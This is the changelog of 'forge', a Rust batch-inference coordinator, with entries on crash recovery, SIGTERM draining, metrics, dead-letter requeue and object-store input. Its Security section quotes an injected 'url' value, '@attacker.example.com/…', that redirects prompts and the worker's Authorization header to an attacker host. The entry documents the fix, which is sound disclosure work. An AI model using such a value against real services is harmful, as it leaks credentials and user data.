# Changelog

All notable changes to this project are documented here. The format is based on
[Keep a Changelog](https://keepachangelog.com/), and this project adheres to
[Semantic Versioning](https://semver.org/) (pre-1.0: minor = breaking).

## [Unreleased]

## [0.2.0] — 2026-09-10

### Fixed
- **`serve-batch` no longer leaves zombie batches after a restart.** A batch that was
  still running when the process died was re-listed with no supervisor and its persisted
  status still `in_progress`, so `GET /v1/batches/{id}` answered `in_progress` forever
  for a job that had stopped dead. A customer's SDK polls that indefinitely; nothing
  errors and nothing alerts, and the only symptom is a number that never moves. (A batch
  that *drained* before the crash was already finalized on read — the hole was the
  half-done one, which is the common case, because a process is most likely to die while
  it is busy.) Its supervisor is now restarted on boot, which is safe because every step
  is idempotent: `ingest_jsonl` skips ids already hydrated, the queue is durable, and the
  store dedups by `custom_id`. A batch whose input file is gone from the registry is
  failed with a reason rather than left claiming progress it will never make.
- **A truncated batch-server registry stops the boot instead of silently emptying it.**
  `files.json` was written with a plain `fs::write` (truncate, then write) and reloaded
  through a nest of `if let Ok(..)`. A crash in that window left it truncated; the next
  start loaded an **empty** registry and the next upload persisted that empty map — a
  recoverable half-written file became the permanent loss of every file record, silently,
  while the uploaded bytes sat intact on disk. Registry writes are now atomic (temp +
  fsync + rename) and an unreadable registry is a named refusal that says where the bytes
  are and how to recover. One unreadable *batch* record is still only skipped, with a
  loud warning: refusing to start would take the whole server down over a single job.

### Added
- **The Helm chart is linted and rendered in CI**, which it never had been. The render
  job checks the chart against the binary: every `--flag` the chart passes must be one
  the binary declares, the readiness path must be a route `server.rs` answers, and no
  `livenessProbe` may appear. This is the check that was missing when a probe pointed at
  `/healthz` against a binary serving `/v1/health`.
- **`forge_queue::snapshot_db` — a consistent online snapshot of the durable queue.**
  Uses SQLite's `VACUUM INTO`, which writes a self-contained file holding exactly the
  state committed when it started, without blocking the writer.
  - **This is why it is an API and not `tar`.** The queue is WAL-mode: committed state
    lives across `state.db`, `state.db-wal` and `state.db-shm`, so an archiver reading
    those at three different moments captures a torn set. The failure is silent — the
    copy opens and is simply short.
- **Operator eyes.** A forge process was close to unobservable: no version anywhere, no
  request correlation, and no progress between "starting" and "done".
  - **Build identity** (`forge_core::build`): version, git sha and target, in a startup
    log line and on `/v1/health`. The sha comes from an optional `FORGE_GIT_SHA` build
    argument rather than a `build.rs` that shells out to git — inside the release
    container there is no `.git`, so a build script would bake in `unknown` or, worse, a
    stale sha from someone's laptop. An absent sha is a true statement; a wrong one
    sends someone diffing the wrong commit.
  - **Structured logs**: `--log-format json` (or `FORGE_LOG_FORMAT`) emits one JSON
    object per line for a log shipper.
  - **Request ids** on the HTTP server. An inbound `x-request-id` is echoed so a
    caller's traces join to forge's — after sanitising, because that value lands in a
    response header (where a CRLF splits the response) and in every log line for the
    request (where a newline forges a log record). Every response carries the id, not
    just errors: "quote the request id" only works as support advice if a
    successful-but-wrong response has one too.
  - **Progress heartbeat** during a run: `done`/`total`, in-flight, items/sec and an ETA,
    every 30s by default (`RunConfig::progress_every`; `Duration::ZERO` disables it). A
    multi-hour job used to be indistinguishable from a wedged one — both logged nothing.
- **Logs no longer corrupt `--json` output.** `tracing_subscriber::fmt()` writes to
  **stdout** by default, so every log line shared a stream with the payload a caller is
  parsing. It was latent while the only lines were warnings — a rejected-input notice
  would silently break `forge status --json` for whoever hit it — and adding a startup
  line turned it into a certainty. Diagnostics go to stderr; stdout is the command's
  answer. There is a test.
- **A 5xx no longer describes the server.** `could not persist upload: {e}` and
  `other.to_string()` handed customers absolute filesystem paths, the per-tenant
  directory layout and disk state — none of which they can act on. The detail is now
  logged against the request id and the body carries only that id.
- **`/v1/health` stopped leaking a count.** It returned a batch count on the one route
  that has to stay unauthenticated for a load balancer. `/metrics` is operator-gated on
  exactly that class of figure, so answering it here made the gate decorative. Health now
  reports liveness, build identity and uptime; the count stays on `/metrics`, behind the
  key.
- **A SIGTERM now drains instead of being ignored.** `serve-batch` waited on `ctrl_c()`
  alone — SIGINT, which only ever comes from a human at a terminal — while Kubernetes
  (eviction, rollout, scale-down), `docker stop`, systemd and a spot reclaim all send
  **SIGTERM**. The graceful path therefore never ran anywhere it mattered: the process
  sat until the grace period expired and was SIGKILLed mid-flight. `run` and `resume`
  had no signal handling at all.
  - `BatchRun::with_shutdown(flag)` is the seam: when the flag flips the loop stops
    leasing **new** work and lets everything already in flight finish, result-before-ack,
    then returns normally. Items never leased are still `Pending`, so the run exits
    `Incomplete` (2) and `resume` is the correct next step — which is exactly what an
    orchestrator branches on.
  - Being hard-killed was always *correct* (leases expire, the reaper reclaims, the
    store write is idempotent). It is not free: every in-flight item is GPU time already
    spent that must be spent again, and none of it is reclaimable until the lease TTL
    elapses. On a spot preemption's ~30s warning, draining turns that loss into nothing.
  - **A second signal does not escalate.** A drain finishes only what is already in
    flight; an impatient second Ctrl-C would throw away precisely the work the first one
    was protecting. The escape hatch is SIGKILL, which is safe here because the queue is
    crash-safe — a hard kill costs GPU minutes, never correctness.
- **`forge requeue` — the dead-letter return leg, on the same job.** Dead-letters were
  terminal with no way back except starting a second job from a rebuilt input, which
  meant a second checkpoint and a second results file to merge. `requeue` moves selected
  dead items back to `pending` with a fresh retry budget (`attempts` reset, `last_error`
  cleared — a requeue that kept the exhausted count would be leased once and dead-letter
  again immediately) and keeps the job, its ingest checkpoint and its results file
  intact. Select with `--ids` (takes `verify`'s `.missing.txt` or the `.dead.jsonl`
  directly), `--reason <substring>`, or `--all`; there is no default, because reversing a
  terminal state must not guess at scope.
  - **The prune is the feature, not the tidying.** `forge-store` rebuilds its emitted-id
    set by scanning `<out>` **and** `<out>.dead.jsonl`, and `put` skips any id already in
    it — so an item requeued while its dead record still stands is re-leased, re-run
    against a real GPU, and has its fresh result **silently discarded**. You would pay
    for the retry and get nothing, with no error anywhere. `forge_store::prune_dead_letters`
    removes those records atomically (temp + `rename`, fsync before the rename) and
    preserves verbatim any line it cannot parse.
  - **Store first, queue second.** Reversed, a crash between the two leaves items
    runnable whose dead records still stand — the silent-loss case above. In this order
    the crash window leaves items still marked dead whose records are already gone, which
    `forge verify` reports and which re-running the same command heals: both halves are
    idempotent, and the requeue is driven by the queue rather than by the file that was
    pruned.
  - **Refuses while a coordinator holds a live lease.** That process cached the
    emitted-id set at startup, so pruning the file underneath it reaches nothing and
    every requeued item's result would still be discarded — the same silent loss, made
    invisible by appearing to succeed. The refusal names the lease holders.
  - Still not a DAG: no item relationship is created, nothing is scheduled, and
    `forge subset` + a fresh job remains the documented path when the *requests* need
    changing rather than just re-running.
- **Checkpoint format versioning.** `state.db` carried no version, so a future layout
  change would have been silently misread — leasing and acking rows that no
  longer mean what the binary thinks. A `meta` table now records `schema_version` (plus
  the forge version, for support). A checkpoint written by a **newer** forge is refused
  by name with the remedy; an unreadable version is refused rather than assumed. A
  checkpoint from before this existed is **stamped, not migrated** — v1 *is* that
  layout, nothing about its tables changed, so a working job is not broken by the
  introduction of the field. The protection is forward.
- **`forge_store::sum_usage_from` / `sum_usage_range`** — a resumable, self-describing
  read of a results file. `next_offset` is the byte after the last *newline-terminated*
  line, never the file length: a coordinator appending concurrently leaves a partial
  line, and a window closing at the file length would resume mid-record so the record
  completing it would be counted by neither window. `sum_usage` delegates and is
  unchanged, including its treatment of a usage-less line as one item worth zero.

### Changed
- **Readiness probes default to on.** The path is verified against the route table by CI
  and an operator can now build the image, so shipping them off would mean routing
  traffic to a pod before it can serve.
- **`render_skypilot_task` quotes operator-supplied strings** — `accelerators` for YAML
  (`L4:1` unquoted is a nested mapping, not a string) and `agent_bin`/`endpoint`/`cloud`
  for the shell, since they land in a `run:` command. Never a privilege boundary — every
  input is the operator's own flag — but a binary path with a space is a mundane thing to
  type and should not render a spec that dies confusingly on a spot node. `yaml_dq` now
  escapes control characters too: a raw newline in a double-quoted scalar *folds to a
  space* rather than erroring, which silently changes a value.
- **`RunConfig` gained `progress_every`** (breaking for a struct literal without
  `..Default::default()`; pre-1.0, so minor = breaking).

### Security
- **`item.url` is validated before it reaches an outbound request.**
  `WorkerSpec::request_url` concatenated the caller-supplied `url` field onto the
  worker's `base_url` with no validation. Because `@` separates userinfo from host
  in a URL authority, a JSONL line carrying
  `"url": "@attacker.example.com/v1/chat/completions"` re-hosted the request: the
  prompt body **and** the worker's `Authorization` header (a `reqwest` default
  header, sent regardless of host) went to the attacker's host, while
  `EndpointKind::from_path` still matched on the path substring so nothing
  downstream noticed. A `url` must now be empty or an absolute path, with `@`,
  leading `//`, backslashes and control bytes refused (`forge_core::valid_item_url`).
  Enforced at **both** ingest (`forge_shard::parse_line`, so a bad line lands in the
  reject sidecar with a readable reason) and dispatch (`request_url`, which no path
  can bypass — including `wire_to_item` off the unauthenticated coordinator wire).
  Every documented `url` shape is unaffected.

### Fixed
- **llama.cpp runs no longer report zero tokens.** `TokenUsage` documented
  `tokens_evaluated`/`tokens_predicted` as mapping "into the same shape" and nothing
  read them — and llama.cpp's native completion route reports them at the **top level
  of the response with no `usage` object at all**, so the extraction defaulted to zero
  before the field names even mattered. A llama.cpp run therefore recorded no tokens,
  silently zeroing the usage this product's `cost` command reports on. Both layers are
  fixed and the missing total is derived. Purely additive: when the OpenAI names are
  present they win, and a body with no counts anywhere still yields zeros exactly as
  before.

### Added
- **Engine compatibility suite** (`forge-worker/tests/engine_compat.rs`) — one test
  per response shape the docs claim to support: vLLM/SGLang chat, llama.cpp native
  *and* OpenAI-compatible routes, hosted OpenAI (Bearer, probe skipped), Anthropic
  Messages (own headers, derived total), and embeddings. `docs/API.md`'s matrix now
  carries a **Verified** column distinguishing "the parser handles this shape" from
  "this combination has been run", and records plainly that **no row is yet verified
  against real hardware** — a recorded shape cannot catch an engine that changed its
  response, a gateway that rewrites headers, or behaviour under load. Publishing a
  real three-engine run remains outstanding.
- **Typed `embedding` column in Parquet output.** Embeddings-at-scale is the marquee
  batch workload and the reason Parquet output exists, but the vector landed inside
  `body_json` as text — so loading a run into a warehouse or a vector DB meant
  re-parsing JSON per row and re-typing the array. An embeddings run now emits a
  `FixedSizeList<Float32, D>` column that loads directly.
  - `D` is read from the first result carrying a vector (a single-line peek, not a
    pre-pass — a second full read at 50M rows would be expensive). The streaming
    `ParquetStore` fixes it on the first result, where it already creates its writer
    lazily for the same reason.
  - A run with no embeddings produces **exactly the previous schema**, so chat output
    is unchanged.
  - A dead-lettered row reads back **NULL**, not a zero vector — zeros would silently
    poison a nearest-neighbour index in a way nobody notices until query time.
  - A results file mixing embedding widths is a hard **error**, not a truncated or
    padded vector, for the same reason.
- **Mixed-engine fleets: `--workers '[name=][engine:]url'` and per-worker API keys.**
  `--engine`/`--endpoint` were single values applied to every worker URL and the key
  was one process-global env var, so a single run structurally could not span vLLM +
  SGLang + a hosted API — one variable cannot be both an OpenAI key and an Anthropic
  key. Now an entry may carry its own engine hint and its own id, and
  `FORGE_WORKER_API_KEY_<WORKER_ID>` overrides the global key for that worker
  (env-only, as before — never a flag, never logged).
  - **Backward compatible by construction:** the `engine:` prefix is accepted only
    when it names a known engine, so `http://gpu1:8000` still parses as a plain URL
    rather than as `http:` + the rest. A test pins that.
  - The point is **spot-to-hosted spillover**: when spot capacity disappears mid-run,
    work continues on a hosted endpoint instead of stalling until capacity returns.
    No closed Batch API can offer that, because they own the compute.
  - Verified end to end against two mock engines: in one run `gpu1` (self-hosted
    vLLM) received *no auth header* while `spill` (hosted) received only its own key.
- **`GET /metrics` on `forge serve-batch`** — Prometheus text exposition on the
  long-running service the OSS Helm chart deploys. Until now it served exactly
  `/v1/health`, and the documented way to collect forge metrics was
  `forge status --prometheus` on a timer — a CLI read of a checkpoint file, which
  cannot run in the shipped `FROM scratch` image at all because there is no shell.
  - Exposes **counters** (`_total`, process-lifetime and monotonic: batches
    created/completed/cancelled/failed, files uploaded, HTTP requests and errors) as
    well as gauges. That distinction is the point: `rate()` over a counter answers
    "are we still completing batches?", which is the question an alert asks and which
    a gauge-only exposition cannot answer. Levels stay gauges, because a level cannot
    be rated.
  - Every batch status is emitted even at zero, so a dashboard shows `0` rather than
    a gap before anything has failed.
  - Behind the bearer key, unlike `/v1/health`. Health must be reachable by a load
    balancer holding no credential and leaks only a batch count; metrics carry
    per-status batch and item counts. Prometheus supports bearer tokens.
- **`--input s3://… / gs:// / az://` — inputs can finally come from where the data
  already is.** `--out` has accepted object-store URLs for a while now; `--input`
  stayed a local path, so every user staged tens of GB onto a disk before forge would
  look at it — on Kubernetes, sizing a PVC for data already sitting in object storage.
  The object is **streamed**, never staged, so the bounded-RAM property holds at 50M
  lines. Resume works by ranged GET from the recorded checkpoint offset, and the
  local path's truncation guard is mirrored: an offset past the object's end rewinds
  and rescans rather than silently ingesting nothing. Feature-gated (`object_store`)
  exactly like the write side, so the lean musl binary is unchanged — verified: zero
  new packages in `Cargo.lock`.
  - Both paths now run the *same* line-oriented ingest via the new
    `forge_shard::ingest_reader_with_rejects`; the object-store case only supplies a
    different reader, so batching, the reject sidecar and the `Shard` bookkeeping
    cannot drift between them.
  - `--prefix-bucket` is refused with an object-store input rather than silently
    ignored: it is a local reordering pass over a seekable file, and quietly dropping
    it would leave an operator wondering why their cache-hit rate never moved.
- **`forge subset --input <in> --ids <list> --out <retry>`** — the return leg after
  a partly-failed run. Reads either sidecar forge already emits, with no reshaping:
  bare ids from `forge verify`'s `.missing.txt`, or the store's `.dead.jsonl`
  records. `--invert` emits the complement. Until now the runbook told operators to
  hand-write a shell join for this, at the worst possible moment — right after a
  large run failed. It is a stateless streaming file filter in the same category as
  `forge import`: it creates no item relationship, records no state, and schedules
  nothing, so the no-DAG boundary is untouched. Memory is bounded by the id list
  (not the input), which is the right trade when the list is the failures.
- **Completion and stall hooks — unattended runs.** `--on-complete` fires when a
  run reaches a terminal state; `--on-stall` fires once if no item reaches a
  terminal state for `--stall-secs` (default 900), which is the dead-spot-fleet
  case: process alive, queue not moving. Both take an `http(s)://` URL (JSON is
  POSTed — the only form that works in the `FROM scratch` image, which has no shell
  to exec) or a program run directly with the payload on stdin. A hook can never
  fail the run, and targets are parsed before any work starts so a typo exits
  immediately rather than after six hours. *Outbound only: forge reports on its own
  run and still decides nothing about what runs next, so the no-DAG boundary is
  untouched.*
- **Distinct exit codes — a contract for orchestrators.** `0` complete, `1`
  run-time failure, `2` incomplete (resume — expected to succeed), `3` usage /
  bad input (never retry), `4` complete with dead-letters. Documented in
  [docs/OPERATIONS.md](./docs/OPERATIONS.md) and pinned by
  `forge-cli/tests/exit_codes.rs`. The distinction that earns its keep is `2` vs
  `3`: retrying an incomplete run is cheap and correct, retrying a malformed input
  burns the same GPU minutes to fail identically.

### Changed
- **`forge verify` now exits `2` rather than `1`** when ids are missing. Still
  non-zero, so `set -e` scripts behave as before, but a pipeline can now tell
  "resume this" from "a human must fix this". A missing input file is likewise `3`
  rather than `1`.


### Fixed
- **The chart probes a route that exists.** `probes.path` was `/healthz`; the binary
  serves `/v1/health`, so enabling probes crash-looped a healthy pod. Readiness only,
  deliberately: `/v1/health` is served by the same fixed accept-thread pool that
  handles uploads, so a healthy pod mid-ingest stops answering it and a liveness
  probe would kill the in-flight job (measured with `threads=1`).

## [0.1.2] — 2026-07-10

### Added
- **Hosted provider endpoints as workers.** `--engine openai-api` /
  `--engine anthropic-api` drive hosted APIs directly: the env-only
  `FORGE_WORKER_API_KEY` (never a flag, never logged) is sent in the
  provider's own header style, the health probe is skipped (hosted APIs
  expose none — real responses drive AIMD and cooldown), and the
  **Anthropic Messages** shape is supported natively end to end:
  `--endpoint messages` / per-item `url: /v1/messages`, content
  validation on `content[0].text`, and `input_tokens`/`output_tokens`
  (plus `cache_read_input_tokens`) metered into the same cost ledger as
  every other provider. With no key set, behavior is unchanged: no auth
  headers, ever.
- Provider-neutral docs: the worker-compatibility matrix in
  [docs/API.md](./docs/API.md) is the single answer to "what can be a
  forge worker" — self-hosted OpenAI-compatible engines, hosted
  OpenAI-compatible APIs, and hosted Anthropic-compatible Messages APIs.

## [0.1.1] — 2026-07-10

### Changed
- **Sliding-window dispatch** replaces wave-based batching: completions
  immediately free slots that are topped up against workers' FREE capacity, so
  a slow worker can no longer head-of-line-block a mixed fleet (measured: a
  2-fast + 1-weak fleet went from *slower than one fast box* to 2.8× faster;
  single-box throughput +20% to ~97% of the engine ceiling).
- `forge resume` now reuses the per-worker `--concurrency` the original `run`
  recorded in the checkpoint (explicit flag still wins, warned on divergence)
  — a bare resume can no longer restart AIMD at a ceiling the fleet was not
  configured for.

### Added
- **Kubernetes**: repo-root `Dockerfile` (FROM-scratch, ~5 MB, nonroot) and the
  `deploy/helm/forge` chart — `serve-batch` as a Deployment (PVC, probes,
  Secret-backed bearer key) and one-shot `forge run` as a Job whose PVC-backed
  checkpoint turns evictions into resumes. Official multi-arch images at
  `docker.io/mancube/forge`; the chart ships as an OCI artifact at
  `oci://registry-1.docker.io/mancube/forge-chart`.
- **BENCHMARKS**: fleet-scheduling and overload-safety sections, plus an
  isolated EC2 run (cross-node fleet ~90% of ceiling; coordinator at ~10 MB
  RSS / <1% CPU); `examples/engine_sim.py` ships the reproducible engine sim.

## [0.1.0] — first public release

The batch-inference coordinator, end to end: fan a JSONL of independent
requests across N OpenAI-compatible endpoints, survive kills and spot
interruptions, and prove completeness — as a single static binary.

### Core

- **Fan-out engine** (`forge-core`): `Pending → Leased → Done | DeadLetter`
  item state machine (no inter-item edges, by doctrine), `Queue` / `Worker` /
  `ResultStore` traits, full-jitter `RetryPolicy`, store-before-ack ordering,
  and the concurrent `BatchRun` loop bounded by the fleet's total in-flight
  capacity.
- **Durable queue** (`forge-queue`): WAL SQLite with single-writer leases and
  idempotent hydrate; pure-Rust `redb` backend behind a feature for zero-C
  builds. Lease fencing: a stale worker can never close a re-leased item.
- **Streaming ingest** (`forge-shard`): 50M-line JSONL never enters RAM;
  `custom_id` validation, duplicate flagging, parse-error sidecar. Opt-in
  `--prefix-bucket` reorders input by `(model, system-prompt)` so engine
  prefix caches stay hot.
- **HTTP worker** (`forge-worker`): OpenAI-compatible POST, per-item
  `TokenUsage` capture (including `cached_tokens` / `reasoning_tokens`),
  always-on AIMD adaptive concurrency, adaptive cooldown learned from 429s /
  `Retry-After` / `x-ratelimit-*` headers, load-aware dispatch, and an
  optional `governor` GCRA req/sec ceiling (feature-gated).
- **Results** (`forge-store`): idempotent JSONL keyed by `custom_id`
  (exactly-once *effect*), dead-letter sidecar; optional `object_store`
  backend (S3/GCS/Azure) with write-if-absent objects and an O(emitted)
  manifest for resume; optional Parquet export (feature-gated, bounded RAM).

### CLI

- `forge run / resume / status / sweep / audit / verify / import / cost /
  export / serve-batch`. `status` emits human, `--json`, and `--prometheus`
  output; `audit` reports what a resume would reclaim; `verify` proves every
  input id has a terminal result at 50M scale in bounded RAM; `cost` turns
  captured usage into `$ / Mtok`, tokens-per-dollar, and savings vs a named
  online baseline.

### Spot resilience

- `forge-spot` poll-only interruption watchers (AWS/GCP/Azure), the optional
  co-located `forge-agent` drain agent with the `forge-proto` wire contract,
  and a networked lease-proxy coordinator (store-then-ack over a real socket).
- Measured **kill -9 → resume → zero-loss** proof in [BENCHMARKS.md](./BENCHMARKS.md).

### Batch REST front door

- `forge serve-batch`: the OpenAI Batch REST contract (`/v1/files`,
  `/v1/batches`, result-file retrieval) over the same engine — unmodified
  OpenAI SDK code runs its batch flow against your own endpoints, with real
  per-item progress and mid-run partial results.

[Unreleased]: https://github.com/lucheeseng827/forge/compare/v0.2.0...HEAD
[0.2.0]: https://github.com/lucheeseng827/forge/compare/v0.1.2...v0.2.0
[0.1.2]: https://github.com/lucheeseng827/forge/compare/v0.1.1...v0.1.2
[0.1.1]: https://github.com/lucheeseng827/forge/compare/v0.1.0...v0.1.1
[0.1.0]: https://github.com/lucheeseng827/forge/releases/tag/v0.1.0
